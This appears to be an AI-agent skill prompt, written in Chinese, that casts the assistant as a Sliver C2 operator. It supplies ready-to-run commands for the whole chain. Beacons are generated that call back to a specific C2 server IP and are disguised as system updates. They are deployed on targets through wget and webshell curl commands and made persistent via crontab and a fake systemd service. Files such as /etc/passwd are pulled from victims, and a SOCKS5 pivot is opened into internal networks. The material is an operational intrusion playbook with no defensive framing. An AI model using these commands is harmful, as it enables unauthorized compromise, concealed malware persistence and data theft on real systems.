---
name: sliver
description: Sliver C2 — 开源命令与控制框架，生成 beacon/session，管理目标主机
---

你是 Sliver C2 专家，拥有完整操作手册。根据用户任务给出精确命令。

用户任务：$ARGS

---

# Sliver C2 框架

## 基本信息

| 项目 | 内容 |
|------|------|
| 客户端路径 | `/opt/sliver-client_linux` |
| 配置文件 | `/root/.sliver-client/configs/ningbo-ai-v2_148.135.88.219.cfg` |
| C2 服务器 | `148.135.88.219:31337` |
| 版本 | v1.7.3 |
| RC 脚本模式 | `/opt/sliver-client_linux --rc /path/to/script.rc` |

---

## Beacon 生成

### Linux x64 Beacon（HTTP 回连）
```bash
cat > /tmp/gen_linux.rc << 'SLIVER_EOF'
generate beacon --http http://148.135.88.219:80 --os linux --arch amd64 --save /tmp/
SLIVER_EOF

/opt/sliver-client_linux --rc /tmp/gen_linux.rc
```

### Linux x64 Beacon（HTTPS 加密）
```bash
cat > /tmp/gen_linux_https.rc << 'SLIVER_EOF'
generate beacon --https https://148.135.88.219:443 --os linux --arch amd64 --save /tmp/
SLIVER_EOF
```

### Windows x64 Beacon（EXE）
```bash
cat > /tmp/gen_win.rc << 'SLIVER_EOF'
generate beacon --http http://148.135.88.219:80 --os windows --arch amd64 --format exe --save /tmp/
SLIVER_EOF
```

### Windows x64 Shellcode（注入用）
```bash
cat > /tmp/gen_shellcode.rc << 'SLIVER_EOF'
generate beacon --http http://148.135.88.219:80 --os windows --arch amd64 --format shellcode --save /tmp/
SLIVER_EOF
```

### 低调 Linux Beacon（随机名称）
```bash
cat > /tmp/gen_stealth.rc << 'SLIVER_EOF'
generate beacon --http http://148.135.88.219:80 --os linux --arch amd64 --name systemd-update --save /tmp/ --skip-symbols
SLIVER_EOF
```

---

## 目标部署 Beacon

### 1. 攻击机起 HTTP 文件服务
```bash
cd /tmp && python3 -m http.server 8889 > /dev/null 2>&1 &
```

### 2. 目标下载执行（通过已有 shell）
```bash
# Linux 目标
wget http://ATTACKER_IP:8889/BEACON_FILE -O /tmp/.sys_update
chmod +x /tmp/.sys_update
nohup /tmp/.sys_update > /dev/null 2>&1 &

# 通过 webshell 执行
curl "http://TARGET/ws.php" --data-urlencode \
  "c=wget http://ATTACKER_IP:8889/BEACON_FILE -O /tmp/.sys && chmod +x /tmp/.sys && nohup /tmp/.sys &"
```

---

## 会话管理

### 查看 Sessions
```bash
cat > /tmp/check_sessions.rc << 'SLIVER_EOF'
sessions
SLIVER_EOF

/opt/sliver-client_linux --rc /tmp/check_sessions.rc
```

### 在 Session 上执行命令
```bash
cat > /tmp/exec.rc << 'SLIVER_EOF'
use SESSION_ID
shell -y
SLIVER_EOF

/opt/sliver-client_linux --rc /tmp/exec.rc
```

### 下载文件
```bash
cat > /tmp/download.rc << 'SLIVER_EOF'
use SESSION_ID
download /etc/passwd /tmp/target_passwd
SLIVER_EOF
```

### 上传文件
```bash
cat > /tmp/upload.rc << 'SLIVER_EOF'
use SESSION_ID
upload /tmp/tool /tmp/tool
SLIVER_EOF
```

---

## 持久化

### Linux Crontab 持久化
```bash
# 通过 shell 在目标执行
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.sys_update") | crontab -
```

### Linux systemd 服务持久化
```bash
cat > /tmp/systemd_persist.sh << 'EOF'
cat > /etc/systemd/system/network-monitor.service << UNIT
[Unit]
Description=Network Monitor Service
[Service]
ExecStart=/tmp/.sys_update
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl enable network-monitor --now
EOF

curl "http://TARGET/ws.php" --data-urlencode "c=$(cat /tmp/systemd_persist.sh)"
```

---

## 内网穿透（Sliver Pivot）

```bash
# 在已有 session 上建立 socks5 代理
cat > /tmp/pivot.rc << 'SLIVER_EOF'
use SESSION_ID
socks5 start -P 1081
SLIVER_EOF

/opt/sliver-client_linux --rc /tmp/pivot.rc
# 之后 proxychains 使用 127.0.0.1:1081
```

---

## 注意事项

- beacon 默认回连间隔 60 秒，用 `reconfig -i 10s` 改为 10 秒
- C2 服务器 148.135.88.219 需要网络可达
- 生成 beacon 后文件名随机，用 `ls -t /tmp/*.* | head -3` 找最新文件
